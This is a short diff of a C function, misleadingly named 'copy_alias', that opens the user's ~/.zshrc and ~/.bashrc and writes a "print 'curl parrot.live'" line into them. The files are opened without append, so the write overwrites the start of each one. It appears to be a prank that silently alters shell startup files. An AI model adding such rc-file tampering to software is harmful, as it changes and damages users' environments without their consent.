@@ -7,7 +7,6 @@ int	copy_alias(int file_count, char **envp)
 	int			fd;
 	static char	*command = "print 'curl parrot.live'";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
-	char		buffer[PATH_MAX];
 	char		*path;
 
 	i = -1;
@@ -27,12 +26,11 @@ int	copy_alias(int file_count, char **envp)
 	while (file_list[++i])
 	{
 		path = ft_strjoin(getenv("HOME"), file_list[i]);
-		// realpath(file_list[i], buffer);
-		printf("opening %s with abs path %s\n", path, buffer);
+		printf("opening %s\n", path);
 		fd = open(path, O_RDONLY | O_WRONLY);
-		printf("on fd %d\n", fd);
 		if (fd < 0)
 			return (1);
+		printf("%s\n", command);
 		dprintf(fd, "%s\n", command);
 	}
 	return (0);
